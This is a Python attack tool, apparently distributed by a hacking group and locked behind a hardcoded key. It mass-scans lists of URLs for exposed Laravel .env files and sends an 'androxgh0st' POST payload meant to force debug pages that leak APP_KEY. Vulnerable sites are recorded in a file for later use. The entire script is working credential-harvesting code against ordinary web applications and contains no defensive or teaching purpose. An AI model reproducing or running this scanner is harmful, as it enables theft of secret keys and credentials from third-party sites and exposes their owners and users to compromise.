from multiprocessing import Lock
import requests
from bs4 import *
from random import *
from multiprocessing.dummy  import Pool ,Process , Lock
import json
from colorama import Fore as F , init
from requests.api import get
init(autoreset=True)
import urllib
from tkinter import * 
from tkinter import filedialog
from threading import Thread
from console.utils import set_title
class Checker_Start():
    def __init__(self) -> None:
        self.lock = Lock()
        self.bad = 0
        self.live = 0
        self.session = requests.Session()
    def titl(self):
        set_title(f'LARAVEL IPS SCANNER CODED BY GarudaSecurity | [Live] = {self.live} | [Bad] = {self.bad}')    
    def Bad(self):
        return F'{F.RED} [+] Bad - > ' 
    def Goodanyway(self):
        return f'{F.GREEN} [+] Live - >'   
    def env(self , urls):
        urls = urls.strip()
        try : 


            get_source = self.session.get(urls+"/.env").text
            get_source_2 = self.session.post(urls, data={"0x[]":"androxgh0st"}).text 
        except  : 
            pass    
        try :
            if 'APP_KEY=' in get_source : 
                self.live +=1
                print(self.Goodanyway() + urls)
                with open('Live.txt','a') as out : 
                    out.write(f'{urls} \n')
         
            if '<td>APP_KEY</td>' in get_source_2    :
                self.live +=1
                
                print(self.Goodanyway() + urls)  
                with open('Live.txt','a') as out : 
                    out.write(f'{urls} \n')
        except :
            self.bad +=1
            print(self.Bad() + urls)   
        self.titl()     
    def main(self):

        print(f'''
        {F.GREEN}
     _                               _   _____                                 
    | |                             | | /  ___|                                
    | |     __ _ _ __ __ ___   _____| | \ `--.  ___ __ _ _ __  _ __   ___ _ __ 
    | |    / _` | '__/ _` \ \ / / _ \ |  `--. \/ __/ _` | '_ \| '_ \ / _ \ '__|
    | |___| (_| | | | (_| |\ V /  __/ | /\__/ / (_| (_| | | | | | | |  __/ |   
    \_____/\__,_|_|  \__,_| \_/ \___|_| \____/ \___\__,_|_| |_|_| |_|\___|_|   
{F.WHITE}                                   
                        [*] Coded By SukaJanda01 
                        [*] Contact us  : > @janda20
        ''')
        try : 
            Key = input(' [+] Enter The Key -> ')
            if Key == 'SukaJanda01' : 
                url = list(x.strip() for x in open(input(' $#root> Your List > '),'r').readlines())
                p = Pool(int(input(' How Mush Thread U Want ?  - >')))
                for _ in p.imap_unordered(self.env, url):
                    pass
            elif Key != 'SukaJanda01' : 
                print(' WRONG KEY Brother :D! ') 
            else : 
                pass    

        except : 
            print(self.Bad())    
class Main(Checker_Start):
    def __init__(self) -> None:
        super().__init__()
        self.main()
if __name__ == '__main__':
    Main()
    

